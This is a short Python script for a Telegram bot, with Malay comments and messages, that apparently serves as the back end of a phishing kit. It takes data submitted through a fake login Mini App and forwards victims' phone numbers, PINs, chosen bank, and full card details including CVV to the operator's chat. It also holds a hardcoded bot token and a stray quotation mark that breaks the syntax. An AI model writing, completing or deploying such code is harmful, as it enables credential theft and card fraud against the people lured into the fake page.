import telebot
import json

# ==============================================
# 👇 GANTI DENGAN TOKEN BOT DARI @BotFather 👇
BOT_TOKEN = '8838751658:AAFxROarY4t-xjw8Atm9avDc5Y0rrKuii6YG'
"
# ==============================================

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def selamat_datang(message):
    bot.send_message(
        message.chat.id,
        "🤖 *Bot Sedia Terima Data!*\n\n"
        "Tekan butang di bawah untuk buka halaman Login.\n"
        "Semua data akan terus sampai ke sini ✅",
        parse_mode="Markdown"
    )

# Terima data dari Mini App
@bot.message_handler(content_types=['web_app_data'])
def terima_data(message):
    try:
        data = json.loads(message.web_app_data.data)
        chat_id = message.chat.id

        if data.get('action') == 'login':
            bot.send_message(
                chat_id,
                "📩 *DATA LOGIN DITERIMA!*\n\n"
                f"📱 Nombor: `{data.get('phone')}`\n"
                f"🔢 PIN: `{data.get('pin')}`",
                parse_mode="Markdown"
            )

        elif data.get('action') == 'bank':
            bot.send_message(
                chat_id,
                f"🏦 *BANK DIPILIH:* `{data.get('bank')}`",
                parse_mode="Markdown"
            )

        elif data.get('action') == 'card':
            bot.send_message(
                chat_id,
                "💳 *DATA KAD DITERIMA!*\n\n"
                f"👤 Nama: `{data.get('name')}`\n"
                f"🔢 Nombor: `{data.get('num')}`\n"
                f"📅 Luput: `{data.get('exp')}`\n"
                f"🔐 CVV: `{data.get('cvv')}`",
                parse_mode="Markdown"
            )

    except Exception as e:
        print(f"Ralat: {e}")

print("✅ Bot sedang berjalan...")
bot.infinity_polling()
